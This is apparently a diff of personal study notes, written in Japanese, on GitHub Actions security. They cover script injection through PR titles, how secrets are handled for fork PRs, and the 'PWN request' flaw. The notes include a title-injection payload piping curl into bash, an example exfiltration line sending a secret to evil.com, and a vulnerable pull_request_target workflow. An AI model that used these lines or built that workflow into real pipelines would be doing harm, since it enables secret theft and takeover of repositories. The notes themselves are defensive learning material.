@@ -46,7 +46,10 @@
 - [x] `${{ github.event.pull_request.title }}` を `run: echo "${{ ... }}"` に直接書くと、どのような攻撃（インジェクション）が可能になるか？:
   - 予想: B（タイトルに `; curl ... | bash` などを仕込むことで、ランナー上で任意のシェルコマンドが勝手に実行される）。
   - 実際: **B（大正解）**。`${{ ... }}` はシェル実行前の単なる「文字列置換」であるため、ダブルクォートで囲っても `"; コマンド; echo "` で簡単に脱出・実行されてしまう。
-- [ ] `pull_request` と `pull_request_target` で `secrets` や `GITHUB_TOKEN` の権限はどう違うか？
+- [x] `pull_request` と `pull_request_target` で `secrets` や `GITHUB_TOKEN` の権限はどう違うか？（ForkからのPRでsecretsはどうなるか？）:
+  - 予想: C（管理者が承認ボタンを押すまでマスクされて隠される）。
+  - 実際: **B（通常の `pull_request` では承認の有無に関わらず、ForkからのPRには一切の `secrets` が渡されず空文字になる。GITHUB_TOKEN も強制的に read-only）**。
+  - 一方で `pull_request_target` は `main` のコンテキストで動作するため `secrets` も Write権限も渡される。そのため、PR側の未信頼コードをチェックアウトして実行すると「PWN request（トークン奪取）」脆弱性になる。
 
 ## 壁打ちメモ
 
@@ -72,6 +75,26 @@
 - **防御策（ベストプラクティス）**:
   - **`${{ ... }}` を `run:` に直接書かない**。
   - 必ず `env:` ブロックで環境変数に格納し、シェル内では `$VAR` として参照する。環境変数への代入はメモリ上の文字列データとして扱われるため、コマンドとして解釈される余地がない。
+
+### 2026-09-25: ForkからのPRとSecrets、最凶の脆弱性「pull_request_target」
+- **ForkからのPRには一切のSecretsが渡らない（B）**:
+  - 初回コントリビューターの承認機能（C）はあるが、承認してワークフローが動いたとしても、通常の `on: pull_request` では **Secretsは完全に空（空文字）** になる。
+  - `GITHUB_TOKEN` も強制的に読み取り専用（read-only）になる。
+  - 理由: もし渡ってしまうと、攻撃者がFork側で `.github/workflows/` やテストコードに `curl evil.com?leak=$SECRET` を仕込んでPRを投げるだけで機密情報を持ち出せてしまうから。
+- **`pull_request_target` の落とし穴（PWN request）**:
+  - 「ForkからのPRでもPRに自動コメント（write権限）したい」「SonarQubeなどの解析トークンを使いたい」という要求のために `on: pull_request_target` が用意された。
+  - `pull_request_target` は `main` ブランチのコンテキストで動くため、**Secretsも渡され、Write権限も付与される**。
+  - **最悪のアンチパターン**:
+    ```yaml
+    on: pull_request_target
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }} # ← Fork側の未信頼コードをチェックアウト
+      - run: npm test # ← 攻撃者の仕込んだ悪意あるコードが、本家のSecrets＆Write権限で実行される！
+    ```
+  - これがGitHub Actions界で最も悪名高い **「PWN request」脆弱性**。
+
 
 
 
